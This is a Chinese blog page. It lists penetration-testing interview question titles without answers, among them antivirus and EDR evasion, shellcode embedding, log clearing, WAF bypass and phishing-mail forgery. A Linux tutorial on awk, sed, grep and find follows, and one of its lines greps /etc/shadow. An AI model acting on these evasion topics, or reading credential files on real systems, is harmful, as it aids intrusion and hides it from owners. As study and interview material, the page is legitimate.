攻击"></a>85-防范常见的 Web 攻击</h2><h2 id="86-什么是webshell"><a href="#86-什么是webshell" class="headerlink" title="86-什么是webshell"></a>86-什么是webshell</h2><h2 id="87-IIS-服务器应该做哪些方面的保护措施："><a href="#87-IIS-服务器应该做哪些方面的保护措施：" class="headerlink" title="87-IIS 服务器应该做哪些方面的保护措施："></a>87-IIS 服务器应该做哪些方面的保护措施：</h2><h2 id="88-xss-有-cookie-一定可以无用户名密码登录吗？"><a href="#88-xss-有-cookie-一定可以无用户名密码登录吗？" class="headerlink" title="88-xss 有 cookie 一定可以无用户名密码登录吗？"></a>88-xss 有 cookie 一定可以无用户名密码登录吗？</h2><h2 id="89-JNI-函数在-java-中函数名为-com-didi-security-main-C-中的函数名是什么样的？"><a href="#89-JNI-函数在-java-中函数名为-com-didi-security-main-C-中的函数名是什么样的？" class="headerlink" title="89- JNI 函数在 java 中函数名为 com.didi.security.main,C 中的函数名是什么样的？"></a>89- JNI 函数在 java 中函数名为 com.didi.security.main,C 中的函数名是什么样的？</h2><h2 id="90-Frida-和-Xposed-框架？"><a href="#90-Frida-和-Xposed-框架？" class="headerlink" title="90-Frida 和 Xposed 框架？"></a>90-Frida 和 Xposed 框架？</h2><h2 id="91-SSRF-利用方式？"><a href="#91-SSRF-利用方式？" class="headerlink" title="91-SSRF 利用方式？"></a>91-SSRF 利用方式？</h2><h2 id="92-HTTPS-握手过程中用到哪些技术？"><a href="#92-HTTPS-握手过程中用到哪些技术？" class="headerlink" title="92-HTTPS 握手过程中用到哪些技术？"></a>92-HTTPS 握手过程中用到哪些技术？</h2><h2 id="93-请写出两种有可能实现任意命令执行的方式？"><a href="#93-请写出两种有可能实现任意命令执行的方式？" class="headerlink" title="93-请写出两种有可能实现任意命令执行的方式？"></a>93-请写出两种有可能实现任意命令执行的方式？</h2><h2 id="94-常见的中间件漏洞？"><a href="#94-常见的中间件漏洞？" class="headerlink" title="94-常见的中间件漏洞？"></a>94-常见的中间件漏洞？</h2><h2 id="95-OWASP-Top10-有哪些漏洞"><a href="#95-OWASP-Top10-有哪些漏洞" class="headerlink" title="95-OWASP Top10 有哪些漏洞"></a>95-OWASP Top10 有哪些漏洞</h2><h2 id="96-蚁剑-菜刀-C-刀-冰蝎的相同与不相同之处"><a href="#96-蚁剑-菜刀-C-刀-冰蝎的相同与不相同之处" class="headerlink" title="96-蚁剑/菜刀/C 刀/冰蝎的相同与不相同之处"></a>96-蚁剑/菜刀/C 刀/冰蝎的相同与不相同之处</h2><h2 id="97-数据库有哪些，关系型的和非关系型的分别是哪些"><a href="#97-数据库有哪些，关系型的和非关系型的分别是哪些" class="headerlink" title="97-数据库有哪些，关系型的和非关系型的分别是哪些"></a>97-数据库有哪些，关系型的和非关系型的分别是哪些</h2><h2 id="98-为何一个-MYSQL-数据库的站，只有一个-80-端口开放？"><a href="#98-为何一个-MYSQL-数据库的站，只有一个-80-端口开放？" class="headerlink" title="98-为何一个 MYSQL 数据库的站，只有一个 80 端口开放？"></a>98-为何一个 MYSQL 数据库的站，只有一个 80 端口开放？</h2><h2 id="99-一个成熟并且相对安全的-CMS，渗透时扫描目录的意义？"><a href="#99-一个成熟并且相对安全的-CMS，渗透时扫描目录的意义？" class="headerlink" title="99-一个成熟并且相对安全的 CMS，渗透时扫描目录的意义？"></a>99-一个成熟并且相对安全的 CMS，渗透时扫描目录的意义？</h2><h2 id="100-在某后台新闻编辑界面看到编辑器，应该先做什么？"><a href="#100-在某后台新闻编辑界面看到编辑器，应该先做什么？" class="headerlink" title="100-在某后台新闻编辑界面看到编辑器，应该先做什么？"></a>100-在某后台新闻编辑界面看到编辑器，应该先做什么？</h2><h2 id="101-审查上传点的元素有什么意义？"><a href="#101-审查上传点的元素有什么意义？" class="headerlink" title="101-审查上传点的元素有什么意义？"></a>101-审查上传点的元素有什么意义？</h2><h2 id="102-CSRF、XSS-及-XXE-有什么区别，以及修复方式？"><a href="#102-CSRF、XSS-及-XXE-有什么区别，以及修复方式？" class="headerlink" title="102-CSRF、XSS 及 XXE 有什么区别，以及修复方式？"></a>102-CSRF、XSS 及 XXE 有什么区别，以及修复方式？</h2><h2 id="103-3389-无法连接的几种情况"><a href="#103-3389-无法连接的几种情况" class="headerlink" title="103-3389 无法连接的几种情况"></a>103-3389 无法连接的几种情况</h2><h2 id="104-目标站无防护，上传图片可以正常访问，上传脚本格式访问则-403，什么原因？"><a href="#104-目标站无防护，上传图片可以正常访问，上传脚本格式访问则-403，什么原因？" class="headerlink" title="104-目标站无防护，上传图片可以正常访问，上传脚本格式访问则 403，什么原因？"></a>104-目标站无防护，上传图片可以正常访问，上传脚本格式访问则 403，什么原因？</h2><h2 id="105-目标站禁止注册用户，找回密码处随便输入用户名提示：“此用户不存在”，你觉得这里怎样利用？"><a href="#105-目标站禁止注册用户，找回密码处随便输入用户名提示：“此用户不存在”，你觉得这里怎样利用？" class="headerlink" title="105-目标站禁止注册用户，找回密码处随便输入用户名提示：“此用户不存在”，你觉得这里怎样利用？"></a>105-目标站禁止注册用户，找回密码处随便输入用户名提示：“此用户不存在”，你觉得这里怎样利用？</h2><h2 id="106-如何突破注入时字符被转义？"><a href="#106-如何突破注入时字符被转义？" class="headerlink" title="106-如何突破注入时字符被转义？"></a>106-如何突破注入时字符被转义？</h2><h2 id="107-拿到一个-webshell-发现网站根目录下有-htaccess-文件，我们能做什么？"><a href="#107-拿到一个-webshell-发现网站根目录下有-htaccess-文件，我们能做什么？" class="headerlink" title="107-拿到一个 webshell 发现网站根目录下有.htaccess 文件，我们能做什么？"></a>107-拿到一个 webshell 发现网站根目录下有.htaccess 文件，我们能做什么？</h2><h2 id="108-安全狗会追踪变量，从而发现出是一句话木马吗？"><a href="#108-安全狗会追踪变量，从而发现出是一句话木马吗？" class="headerlink" title="108-安全狗会追踪变量，从而发现出是一句话木马吗？"></a>108-安全狗会追踪变量，从而发现出是一句话木马吗？</h2><h2 id="109-提权时选择可读写目录，为何尽量不用带空格的目录？"><a href="#109-提权时选择可读写目录，为何尽量不用带空格的目录？" class="headerlink" title="109-提权时选择可读写目录，为何尽量不用带空格的目录？"></a>109-提权时选择可读写目录，为何尽量不用带空格的目录？</h2><h2 id="110-如何利用这个防注入系统拿-shell？"><a href="#110-如何利用这个防注入系统拿-shell？" class="headerlink" title="110-如何利用这个防注入系统拿 shell？"></a>110-如何利用这个防注入系统拿 shell？</h2><h2 id="111-报错注入的函数有哪些？"><a href="#111-报错注入的函数有哪些？" class="headerlink" title="111-报错注入的函数有哪些？"></a>111-报错注入的函数有哪些？</h2><h2 id="112-延时注入如何来判断？"><a href="#112-延时注入如何来判断？" class="headerlink" title="112-延时注入如何来判断？"></a>112-延时注入如何来判断？</h2><h2 id="113-如何拿一个网站的-webshell？"><a href="#113-如何拿一个网站的-webshell？" class="headerlink" title="113-如何拿一个网站的 webshell？"></a>113-如何拿一个网站的 webshell？</h2><h2 id="114-sql-注入写文件都有哪些函数？"><a href="#114-sql-注入写文件都有哪些函数？" class="headerlink" title="114-sql 注入写文件都有哪些函数？"></a>114-sql 注入写文件都有哪些函数？</h2><h2 id="115-代码执行，文件读取，命令执行的函数都有哪些？"><a href="#115-代码执行，文件读取，命令执行的函数都有哪些？" class="headerlink" title="115-代码执行，文件读取，命令执行的函数都有哪些？"></a>115-代码执行，文件读取，命令执行的函数都有哪些？</h2><h2 id="116-img-标签除了-onerror-属性外，还有其他获取管理员路径的办法吗？"><a href="#116-img-标签除了-onerror-属性外，还有其他获取管理员路径的办法吗？" class="headerlink" title="116-img 标签除了 onerror 属性外，还有其他获取管理员路径的办法吗？"></a>116-img 标签除了 onerror 属性外，还有其他获取管理员路径的办法吗？</h2><h2 id="117-为什么-aspx-木马权限比-asp-大？"><a href="#117-为什么-aspx-木马权限比-asp-大？" class="headerlink" title="117-为什么 aspx 木马权限比 asp 大？"></a>117-为什么 aspx 木马权限比 asp 大？</h2><h2 id="118-如何绕过-waf？"><a href="#118-如何绕过-waf？" class="headerlink" title="118-如何绕过 waf？"></a>118-如何绕过 waf？</h2><h2 id="119-mysql-两种提权方式"><a href="#119-mysql-两种提权方式" class="headerlink" title="119-mysql 两种提权方式"></a>119-mysql 两种提权方式</h2><h2 id="120-宽字节注入产生原理以及根本原因"><a href="#120-宽字节注入产生原理以及根本原因" class="headerlink" title="120-宽字节注入产生原理以及根本原因"></a>120-宽字节注入产生原理以及根本原因</h2><h2 id="121-sql-如何写-shell-单引号被过滤怎么办"><a href="#121-sql-如何写-shell-单引号被过滤怎么办" class="headerlink" title="121-sql 如何写 shell/单引号被过滤怎么办"></a>121-sql 如何写 shell/单引号被过滤怎么办</h2><h2 id="122-XSS-蠕虫的产生条件"><a href="#122-XSS-蠕虫的产生条件" class="headerlink" title="122-XSS 蠕虫的产生条件"></a>122-XSS 蠕虫的产生条件</h2><h2 id="123-常见的上传绕过方式-导致文件包含的函数"><a href="#123-常见的上传绕过方式-导致文件包含的函数" class="headerlink" title="123-常见的上传绕过方式.导致文件包含的函数"></a>123-常见的上传绕过方式.导致文件包含的函数</h2><h2 id="124-导致文件包含的函数"><a href="#124-导致文件包含的函数" class="headerlink" title="124-导致文件包含的函数"></a>124-导致文件包含的函数</h2><h2 id="125-金融行业常见逻辑漏洞"><a href="#125-金融行业常见逻辑漏洞" class="headerlink" title="125-金融行业常见逻辑漏洞"></a>125-金融行业常见逻辑漏洞</h2><h2 id="126-常用-WEB-开发-JAVA-框架"><a href="#126-常用-WEB-开发-JAVA-框架" class="headerlink" title="126-常用 WEB 开发 JAVA 框架"></a>126-常用 WEB 开发 JAVA 框架</h2><h2 id="127-php-中命令执行涉及到的函数"><a href="#127-php-中命令执行涉及到的函数" class="headerlink" title="127-php 中命令执行涉及到的函数"></a>127-php 中命令执行涉及到的函数</h2><h2 id="128-宝塔禁止PHP函数如何绕过？"><a href="#128-宝塔禁止PHP函数如何绕过？" class="headerlink" title="128-宝塔禁止PHP函数如何绕过？"></a>128-宝塔禁止PHP函数如何绕过？</h2><h2 id="129-webshell有system权限但无法执行命令，怎么办？"><a href="#129-webshell有system权限但无法执行命令，怎么办？" class="headerlink" title="129-webshell有system权限但无法执行命令，怎么办？"></a>129-webshell有system权限但无法执行命令，怎么办？</h2><h2 id="130-说下strust2的漏洞利用原理？"><a href="#130-说下strust2的漏洞利用原理？" class="headerlink" title="130-说下strust2的漏洞利用原理？"></a>130-说下strust2的漏洞利用原理？</h2><h2 id="131-php-java反序列化漏洞的原理-解决方案"><a href="#131-php-java反序列化漏洞的原理-解决方案" class="headerlink" title="131-php/java反序列化漏洞的原理?解决方案?"></a>131-php/java反序列化漏洞的原理?解决方案?</h2><h2 id="132-CRLF注入的原理"><a href="#132-CRLF注入的原理" class="headerlink" title="132-CRLF注入的原理"></a>132-CRLF注入的原理</h2><h2 id="133-php的LFI，本地包含漏洞原理是什么？写一段带有漏洞的代码。手工的话如何发掘？如果无报错回显，你是怎么遍历文件的？"><a href="#133-php的LFI，本地包含漏洞原理是什么？写一段带有漏洞的代码。手工的话如何发掘？如果无报错回显，你是怎么遍历文件的？" class="headerlink" title="133-php的LFI，本地包含漏洞原理是什么？写一段带有漏洞的代码。手工的话如何发掘？如果无报错回显，你是怎么遍历文件的？"></a>133-php的LFI，本地包含漏洞原理是什么？写一段带有漏洞的代码。手工的话如何发掘？如果无报错回显，你是怎么遍历文件的？</h2><h2 id="134-说说常见的中间件解析"><a href="#134-说说常见的中间件解析" class="headerlink" title="134-说说常见的中间件解析"></a>134-说说常见的中间件解析</h2><h1 id="二、内网"><a href="#二、内网" class="headerlink" title="二、内网"></a>二、内网</h1><ol>
<li>dll 文件是什么意思，有什么用？</li>
<li>重要协议分布层</li>
<li>arp 协议的工作原理</li>
<li>rip 协议是什么？rip 的工作原理</li>
<li>什么是 RARP？工作原理</li>
<li>OSPF 协议？OSPF 的工作原理</li>
<li>TCP 与 UDP 区别总结</li>
<li>什么是三次握手四次挥手？</li>
<li>tcp 为什么要三次握手？</li>
<li>dns 是什么？dns 的工作原理</li>
<li>OSI 的七层模型都有哪些？</li>
<li>session 的工作原理？什么是 TCP 粘包/拆包？发生原因？解决方案</li>
<li>TCP 如何保证可靠传输？</li>
<li>TCP 对应的应用层协议，UDP 对应的应用层协议</li>
<li>什么是网络钓鱼？</li>
<li>0day 漏洞</li>
<li>Rootkit 是什么意思</li>
<li>蜜罐</li>
<li>ssh</li>
<li>震网病毒</li>
<li>NAT（网络地址转换）协议</li>
<li>内网穿透</li>
<li>虚拟专用网络</li>
<li>二层交换机</li>
<li>路由技术</li>
<li>三层交换机</li>
<li>IPv6 地址表示</li>
<li>内网渗透思路？</li>
<li>正向代理和反向代理的区别</li>
<li>Windows 常用的提权方法</li>
<li>Linux 提权有哪些方法</li>
<li>3389 无法连接的几种情况</li>
<li>nmap，扫描的几种方式</li>
<li>渗透测试中常见的端口</li>
<li>用什么扫描端口，目录</li>
<li>3306 1443 8080 是什么端口</li>
<li>清理日志要清理哪些(windows和linux)</li>
<li>go语言免杀shellcode如何免杀？免杀原理是什么？</li>
<li>windows defender防御机制原理，如何绕过？</li>
<li>卡巴斯基进程保护如何绕过进行进程迁移？</li>
<li>fastjson不出网如何利用？</li>
<li>工作组环境下如何进行渗透？详细说明渗透思路。</li>
<li>内存马的机制？</li>
<li>不出网有什么方法，正向shel l 方法除了reg之类的，还有什么？</li>
<li>什么是域内委派？利用要点？</li>
<li>shiro漏洞类型，721原理，721利用要注意什么？</li>
<li>hvv三大洞？</li>
<li>天擎终端防护如何绕过，绕过思路？</li>
<li>免杀木马的思路？</li>
<li>jsonp跨域的危害，cors跨域的危害？</li>
<li>说出印象比较深刻的一次外网打点进入内网？</li>
<li>rmi的利用原理？</li>
<li>域内的一个普通用户（非域用户）如何进行利用？</li>
<li>证书透明度的危害？</li>
<li>内网渗透降权的作用？</li>
<li>TrustedInstall权限的原理是什么？</li>
<li>2008的服务权限如何进行提权？</li>
<li>Windows UAC原理是什么？</li>
<li>Windows添加用户如何绕过火绒以及360？</li>
<li>如何伪造钓鱼邮箱？会面临什么问题？</li>
<li>分别说出redis、weblogic、Mongodb、Elasticsearch、ldap、sambda、Jenkins、rmi默认端口。</li>
<li>烂土豆提权使用过吗？它的原理？</li>
<li>powershell免杀怎么制作？</li>
<li>提取内存hash被查杀，如何绕过？</li>
<li>分别说下linux、windows的权限维持？</li>
<li>如何开展红队工作？</li>
<li>如何把shellcode嵌入到正常exe中？</li>
<li>描述下Spring框架的几个漏洞？</li>
</ol>
<h1 id="三、其他"><a href="#三、其他" class="headerlink" title="三、其他"></a>三、其他</h1><h2 id="一、对称加密和非对称加密"><a href="#一、对称加密和非对称加密" class="headerlink" title="一、对称加密和非对称加密"></a>一、对称加密和非对称加密</h2><ol>
<li>对称加密:加密解密用同一个密钥</li>
<li>非对称加密:公钥加密,私钥解密;公钥可以公开给别人进行加密,私钥永远在自己手里</li>
<li>SYN 攻击原理</li>
<li>什么是网络钓鱼？</li>
<li>什么是 CC 攻击？</li>
<li>Web 服务器被入侵后，怎样进行排查？</li>
<li>你获取网络安全知识途径有哪些？</li>
<li>DDOS</li>
<li>手工查找后门木马的小技巧</li>
<li>脱壳</li>
<li>“人肉搜索”</li>
<li>SYN Flood 的基本原理</li>
<li>什么是手机”越狱“</li>
<li>主机被入侵，你会如何处理这件事自查解决方案：</li>
<li>证书要考哪些？</li>
<li>宏病毒？</li>
<li>APP 加壳？</li>
<li>勒索软件 Wanacry 的特征？蠕虫、僵尸病毒</li>
<li>ARM32 位指令中，返回值和返回地址保存在哪个寄存器中？</li>
<li>Android APP 逆向分析步骤一般是怎么样的？</li>
<li>ddos 如何防护</li>
<li>有没有抓过包，会不会写 wireshark 过滤规则</li>
<li>如何加固一个域环境下的 Windows 桌面工作环境？请给出你的思路。</li>
<li>RSA 算法</li>
<li>AES／DES 的具体工作步骤</li>
<li>如何开展蓝队工作？</li>
</ol>
<h2 id="二、什么是同源策略？"><a href="#二、什么是同源策略？" class="headerlink" title="二、什么是同源策略？"></a>二、什么是同源策略？</h2><h1 id="四、素质面："><a href="#四、素质面：" class="headerlink" title="四、素质面："></a>四、素质面：</h1><h2 id="1-自我介绍？"><a href="#1-自我介绍？" class="headerlink" title="1-自我介绍？"></a>1-自我介绍？</h2><h2 id="2-你愿意加班吗？"><a href="#2-你愿意加班吗？" class="headerlink" title="2-你愿意加班吗？"></a>2-你愿意加班吗？</h2><h2 id="3-为什么投我们公司？"><a href="#3-为什么投我们公司？" class="headerlink" title="3-为什么投我们公司？"></a>3-为什么投我们公司？</h2><h2 id="4-你觉得有哪些是你会别人不会的？"><a href="#4-你觉得有哪些是你会别人不会的？" class="headerlink" title="4-你觉得有哪些是你会别人不会的？"></a>4-你觉得有哪些是你会别人不会的？</h2><h2 id="5-你最想在哪些城市发展？"><a href="#5-你最想在哪些城市发展？" class="headerlink" title="5-你最想在哪些城市发展？"></a>5-你最想在哪些城市发展？</h2>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="https://allofmortal.github.io/2023/05/18/101-A10-Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A43%20%C2%B7%20Farmsec%20Open%20Source/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Mortal">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/05/18/101-A10-Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A43%20%C2%B7%20Farmsec%20Open%20Source/" class="post-title-link" itemprop="url">بدون عنوان</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">نُشر في</span>

              <time title="أُنشأ: 2023-05-18 12:05:30" itemprop="dateCreated datePublished" datetime="2023-05-18T12:05:30+08:00">2023-05-18</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">عُدل في</span>
                <time title="عُدل: 2024-04-28 09:41:55" itemprop="dateModified" datetime="2024-04-28T09:41:55+08:00">2024-04-28</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>本节主要介绍一些文本处理相关的linux命令，是日后信息安全工作中的情报侦察、数据梳理、日志分析等技术的重要基础。</p>
<h2 id="1-awk-命令"><a href="#1-awk-命令" class="headerlink" title="1. awk 命令"></a>1. awk 命令</h2><p><code>awk</code>是一种处理文本文件的语言，是一个强大的文本分析工具。</p>
<p>相比较屏幕处理的优点，<code>awk</code>在处理庞大文件时不会出现内存溢出或是处理缓慢的问题，通常用来格式化文本信息。 <code>awk</code>也是一个非常棒的数据处理工具！相较于<code>sed</code>常常作用于一整个行的处理, <code>awk</code>则比较倾向于一行当中分成数个<code>字段</code>来处理。</p>
<p><code>awk</code>处理过程: 依次对每一行进行处理，然后输出。</p>
<p>命令的基本格式是：<code>awk ‘&#123;print($1)&#125;’</code></p>
<p>案例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat 1.txt|awk &#x27;&#123;print($2)&#125;&#x27;                 #打印出文本中每行的第二个字段</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="http://book.fsec.io/bookimages/image-20211122195506148.png" alt=""><br><img src="http://book.fsec.io/bookimages/image-20211122195506148.png" alt=""></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd |awk -F &quot;:&quot; &#x27;&#123;print($1)&#125;&#x27;  #-F指定分隔符，以“：”为分隔符，打印出文本中每行第一个字段</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="http://book.fsec.io/bookimages/image-20211122195728291.png" alt=""><br><img src="http://book.fsec.io/bookimages/image-20211122195728291.png" alt=""></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd |awk -F &quot;:&quot; &#x27;&#123;print($1,&quot;+++&quot;,$3)&#125;&#x27;   #打印出第一个字段与第三个字段，并在其中间添加+++内容</span><br><span class="line">cat /etc/passwd |awk -F &quot;:&quot; &#x27;&#123;print($1&quot;+++&quot;$3)&#125;&#x27;     #对比差异</span><br></pre></td></tr></table></figure>
<p><img src="http://book.fsec.io/bookimages/image-20211122200509841.png" alt=""><br><img src="http://book.fsec.io/bookimages/image-20211122200509841.png" alt=""></p>
<p><a target="_blank" rel="noopener" href="http://book.fsec.io/bookimages/image-20211122200548688.png"><img src="http://book.fsec.io/bookimages/image-20211122200548688.png" alt="">
</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat passwd | awk -F &quot;:&quot; &#x27;&#123;print $NF&#125;&#x27;       #打印出文本中每行的最后一个字段</span><br><span class="line">cat passwd | awk -F &quot;:&quot; &#x27;&#123;print $(NF-1)&#125;&#x27;   #打印出文本中每行的倒数第二个字段。$（NF-1）为倒数第二，依此类推。</span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="http://book.fsec.io/bookimages/image-20211122200733645.png"><img src="http://book.fsec.io/bookimages/image-20211122200733645.png" alt="">
</a></p>
<p><a target="_blank" rel="noopener" href="http://book.fsec.io/bookimages/image-20211122200819645.png"><img src="http://book.fsec.io/bookimages/image-20211122200819645.png" alt="">
</a></p>
<h2 id="2-sed-命令"><a href="#2-sed-命令" class="headerlink" title="2. sed 命令"></a>2. sed 命令</h2><p><code>sed</code> 是stream editor(流编辑器)的简称，是一款强大的,并且有些复杂的程序。</p>
<p><code>sed</code> 本身是一个管线命令，可以将数据进行替换、删除、新增、提取特定行等功能，主要用来自动编辑一个或多个文件、简化对文件的反复操作、编写转换程序等。sed按行来执行命令。</p>
<p>接下来的实验，我们要以/etc/passwd文件内容为例子。</p>
<p>拷贝文件<code>cat /etc/passwd &gt; 1.txt</code></p>
<p>我们以一个例子来介绍<code>sed</code>命令，<code>sed &#39;s/:/+/g&#39;</code></p>
<p>s代表搜索，g代表的则是全文。不加g的话则是替换每行第一个出现的。所以这条命令代表的将文件中所有的：替换为+</p>
<p><a target="_blank" rel="noopener" href="http://book.fsec.io/bookimages/image-20211122211825410.png"><img src="http://book.fsec.io/bookimages/image-20211122211825410.png" alt="">
</a></p>
<p><code>cat 1.txt |sed &#39;s/:/+/3g&#39;</code> #代表的则是从第三次匹配开始替换，依此类推。</p>
<p><a target="_blank" rel="noopener" href="http://book.fsec.io/bookimages/image-20211122211341555.png"><img src="http://book.fsec.io/bookimages/image-20211122211341555.png" alt="">
</a></p>
<p><code>sed -i &#39;s/:/+/g&#39; 1.txt</code> #参数<code>-i</code>,直接修改文件，并非打印出来。</p>
<p><a target="_blank" rel="noopener" href="http://book.fsec.io/bookimages/image-20211122211940687.png"><img src="http://book.fsec.io/bookimages/image-20211122211940687.png" alt="">
</a></p>
<p>以上这些命令中是以/做为该命令的定界符，如果需要修改或者匹配的字段带有/则不能再使用/做为该条命令的定界符，可以使用任意的定界符，不冲突就行。<code>cat passwd |sed &#39;s!:!/!g&#39;</code> 以！号做为定界也是一样的。</p>
<p>此外，在此命令中，搜索位置使用<code>^</code>代表一行的开头，<code>$</code>代表一行的结尾。<code>sed</code>是以行为单位执行的。</p>
<p>我们用如下案例展示：</p>
<p><code>cat ip.txt |sed &#39;s#^#http://#g&#39;</code>在每行之前加上<code>http://</code>。</p>
<p><a target="_blank" rel="noopener" href="http://book.fsec.io/bookimages/image-20211122214057586.png"><img src="http://book.fsec.io/bookimages/image-20211122214057586.png" alt="">
</a></p>
<p><code>cat ip.txt |sed &#39;s#$#:8080#g&#39;</code>在每行末尾加上“:8080”</p>
<p><a target="_blank" rel="noopener" href="http://book.fsec.io/bookimages/image-20211122214437426.png"><img src="http://book.fsec.io/bookimages/image-20211122214437426.png" alt="">
</a></p>
<p><code>sed &#39;/^$/d&#39; 2.txt</code>删除空白的行。</p>
<p><a target="_blank" rel="noopener" href="http://book.fsec.io/bookimages/image-20211122215435921.png"><img src="http://book.fsec.io/bookimages/image-20211122215435921.png" alt="">
</a></p>
<p><code>sed &#39;/^s/&#39;d</code> 删除文件中所有开头是s的行。</p>
<p><a target="_blank" rel="noopener" href="http://book.fsec.io/bookimages/image-20211122215921901.png"><img src="http://book.fsec.io/bookimages/image-20211122215921901.png" alt="">
</a></p>
<h2 id="3-grep-命令"><a href="#3-grep-命令" class="headerlink" title="3. grep 命令"></a>3. grep 命令</h2><p>grep这个名字来自于短语“global regular expression print”，所以我们能看出 grep 程序和正则表达式有关联。</p>
<p>本质上，grep 程序会在文本文件中查找一个指定的正则表达式,并把匹配行输出到标准输出。</p>
<p>命令格式： <code>grep [options] [pattern]　[filename]</code></p>
<p>案例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cat passwd |grep root                          # 只显示带有root关键字的行</span><br><span class="line">grep -e root passwd                            # 匹配有root的行</span><br><span class="line">grep -v root passwd                            # 忽略匹配到的行</span><br><span class="line">cat passwd |grep -E &quot;root|sshd&quot;                # 包含多个可能性的行</span><br><span class="line">cat passwd |grep -E &#x27;^r&#x27;                       # 以r开头的行</span><br><span class="line">cat passwd |grep -E &#x27;n$&#x27;                       # 以n结尾的行</span><br><span class="line">grep “root” /etc/passwd /etc/shadow            # 查询多个文件</span><br><span class="line">grep &quot;passwd&quot; /etc -rn                         # -r 为递归 -n 显示关键字出现在第几行   在多级目录中对文本进行递归查找</span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="http://book.fsec.io/bookimages/image-20211123000918840.png"><img src="http://book.fsec.io/bookimages/image-20211123000918840.png" alt="">
</a></p>
<p><a target="_blank" rel="noopener" href="http://book.fsec.io/bookimages/image-20211123001220076.png"><img src="http://book.fsec.io/bookimages/image-20211123001220076.png" alt="">
</a></p>
<p><a target="_blank" rel="noopener" href="http://book.fsec.io/bookimages/image-20211123001325985.png"><img src="http://book.fsec.io/bookimages/image-20211123001325985.png" alt="">
</a></p>
<h2 id="4-find-命令"><a href="#4-find-命令" class="headerlink" title="4. find 命令"></a>4. find 命令</h2><p><code>find</code> 命令用来在指定目录下查找文件。任何位于参数之前的字符串都将被视为欲查找的目录名。如果使用该命令时，不设置任何参数，则 find 命令将在当前目录下查找子目录与文件。并且将查找到的子目录和文件全部进行显示。</p>
<p>这是一个超级复杂的命令，最简单的模式为：<code>find 路径 -name [名字]</code>。</p>
<p>案例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">find / -size 1000k                #从根目录查找大小为1000K的文件</span><br><span class="line">find   -name &#x27;1*&#x27;                 #在当前目录下查找文件名以1开始的文件</span><br><span class="line">find / -name &#x27;1*&#x27;                 #从根目录查找文件名以1开始的文件</span><br><span class="line">find / -user farmsec1             #从根目录查找属主为farmsec1的文件</span><br><span class="line">find / -group farmsec             #从根目录查找属组为farmsec的文件</span><br><span class="line">find /etc -type f/d               #按sock类型查找，f代表文件，d代表目录</span><br><span class="line">find . -type f -mtime -7          #搜索7天内当前目录下修改过的文件（-7代表7天内，7代表前7天那一天，+7代表7天前）</span><br><span class="line">find . -type f -mmin -10          #搜索10分钟内当前目录下修改过的文件 </span><br><span class="line">find . -atime -1 -type f          #搜索当前目录下一天内被访问的文件（-1代表1天内，1代表前1天那一天，+1代表1天前）</span><br><span class="line">find . -amin -10 -type f          #搜索当前目录下10分钟内被访问的文件</span><br><span class="line">find . -ctime -1 -type f          #搜索当前目录下一天内状态被改变（列如权限）的文件（-1代表1天内，1代表前1天那一天，+1代表1天前）</span><br><span class="line">find . -cmin -10 -type f          #搜索当前目录下10分钟内状态被改变的文件</span><br><span class="line">find . -perm 777                  #搜索处当前文件下符合777权限的文件</span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="http://book.fsec.io/bookimages/image-20211123021226466.png"><img src="http://book.fsec.io/bookimages/image-20211123021226466.png" alt="">
</a></p>
<p><a target="_blank" rel="noopener" href="http://book.fsec.io/bookimages/image-20211123021254134.png"><img src="http://book.fsec.io/bookimages/image-20211123021254134.png" alt="">
</a></p>
<ul>
<li>exec选项</li>
</ul>
